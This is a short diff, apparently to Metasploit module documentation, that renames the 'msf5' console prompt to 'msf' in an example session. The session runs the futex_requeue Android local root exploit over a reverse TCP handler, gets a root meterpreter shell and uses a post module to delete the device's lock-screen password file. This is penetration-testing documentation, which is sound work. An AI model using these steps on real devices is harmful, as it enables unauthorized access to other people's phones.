@@ -24,7 +24,7 @@
 Utilizing futex_requeue to get root access.
 
   ```
-msf5 exploit(android/local/futex_requeue) > run
+msf exploit(android/local/futex_requeue) > run
 
 [*] Started reverse TCP handler on 111.111.1.111:4444
 [*] Using target: New Samsung
@@ -38,10 +38,10 @@ meterpreter > getuid
 Server username: uid=0, gid=0, euid=0, egid=0
 meterpreter > background
 [*] Backgrounding session 4...
-msf5 exploit(android/local/futex_requeue) > use post/android/manage/remove_lock_root
-msf5 post(android/manage/remove_lock_root) > set session 4
+msf exploit(android/local/futex_requeue) > use post/android/manage/remove_lock_root
+msf post(android/manage/remove_lock_root) > set session 4
 session => 4
-msf5 post(android/manage/remove_lock_root) > run
+msf post(android/manage/remove_lock_root) > run
 
 [!] SESSION may not be compatible with this module.
 [*] Removing /data/system/password.key
